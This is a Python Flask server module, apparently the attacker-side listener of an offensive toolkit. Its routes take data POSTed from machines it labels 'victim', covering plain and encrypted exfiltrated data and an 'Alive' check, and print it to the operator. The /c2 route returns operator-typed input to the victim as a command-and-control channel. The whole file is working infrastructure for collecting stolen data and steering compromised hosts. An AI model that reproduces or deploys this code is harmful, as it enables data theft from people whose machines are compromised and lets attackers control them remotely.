#                     ▄▄▌ ▐ ▄▌      ▄▄▄  ·▄▄▄▄   ▄▄▄· ▄▄▄·  ▄▄· 
#                     ██· █▌▐█▪     ▀▄ █·██▪ ██ ▐█ ▄█▐█ ▀█ ▐█ ▌▪
#                     ██▪▐█▐▐▌ ▄█▀▄ ▐▀▀▄ ▐█· ▐█▌ ██▀·▄█▀▀█ ██ ▄▄
#                     ▐█▌██▐█▌▐█▌.▐▌▐█•█▌██. ██ ▐█▪·•▐█ ▪▐▌▐███▌
#                     ▀▀▀▀ ▀▪ ▀█▄▀▪.▀  ▀▀▀▀▀▀• .▀    ▀  ▀ ·▀▀▀

import colorama
import json
from flask import Blueprint, request, Response
from colorama import Fore, Back, Style
from flask.json import jsonify
from flask.templating import render_template

views = Blueprint("views", __name__)

@views.route("/", methods=["POST"])
def home():
    print("")
    print(Fore.RED + f"~~~~~~~~~~~~~~~~~~~~ Data from victim ~~~~~~~~~~~~~~~~~~~~")
    print(Fore.WHITE + str(request.data))
    print(Style.RESET_ALL)
    print("")
    return "Data recieved!"

@views.route("/enc", methods=["POST"])
def encrypt():
    print("")
    print(Fore.RED + f"~~~~~~~~~~~~~~~~~~~~ Encrypted data from victim ~~~~~~~~~~~~~~~~~~~~")
    print(Fore.WHITE + str(request.data))
    print(Style.RESET_ALL)
    print("")
    return "Data recieved!"

@views.route("/c2", methods=["POST"])
def c2():
    print("")
    print(Fore.RED + f"~~~~~~~~~~~~~~~~~~~~ Data from victim ~~~~~~~~~~~~~~~~~~~~")
    print(Fore.RED + "Connected to victim, send STOP to end the session")
    print(Fore.WHITE + str(request.data))
    print(Style.RESET_ALL)
    print("")
    dictToSend = input("")
    return dictToSend

@views.route("/python", methods=["POST"])
def python():
    print("")
    print(Fore.RED + f"~~~~~~~~~~~~~~~~~~~~ Data from victim ~~~~~~~~~~~~~~~~~~~~")
    input_json = request.get_json(force=True) 
    print(Fore.WHITE + str(input_json))
    dictToReturn = str(Fore.WHITE + "Alive")
    return jsonify(dictToReturn)
